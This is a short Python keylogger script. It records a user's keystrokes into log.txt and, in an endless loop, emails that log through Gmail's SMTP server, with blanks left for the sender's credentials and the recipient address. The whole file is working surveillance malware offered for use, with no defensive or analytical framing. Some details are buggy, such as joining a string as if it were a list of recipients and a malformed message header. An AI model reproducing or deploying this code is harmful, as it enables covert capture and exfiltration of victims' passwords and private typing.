
#!/bin/usr/python
# -*- coding: utf-8 -*-

import threading
import os
import keyboard
import smtplib
from time import sleep



 
def logger():

    FILE_NAME = "log.txt"
    CLEAR_ON_STARTUP = False
    TERMINATE_KEY = "enter"

    if CLEAR_ON_STARTUP:
        os.remove(FILE_NAME)
    
    output = open(FILE_NAME, "a")
    
    for string in keyboard.get_typed_strings(keyboard.record(TERMINATE_KEY)):
        output.write(string)
    
    output.close()

def sendmail():

     

   

    gmail_user = "" #your sender email here
    gmail_password = "" #password
    FROM =gmail_user
    TO = "" #receiver email, can be the same as the sender email too
    SUBJECT= "your log" 

        
    sleep(7.0)
    try:
        F = open("log.txt","r")

        TEXT= F.read()
        message = """\From: %s
To: %s
Subject: %s

%s
        """ % (FROM, ", ".join(TO), SUBJECT, TEXT)
    except:
        print ("error")

    try: 
        server =smtplib.SMTP("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls()
        server.login(gmail_user,gmail_password)
        server.sendmail(FROM, TO, message)
        server.close()
        print ("transmitting")
    except:
        print ("error")


os.system("nano log.txt")

while True:
 
    if __name__ == "__main__":
        
        log = threading.Thread(target=logger)
        mail = threading.Thread(target=sendmail)

 
        log.start()
        mail.start()
 
        log.join()
        mail.join()
 
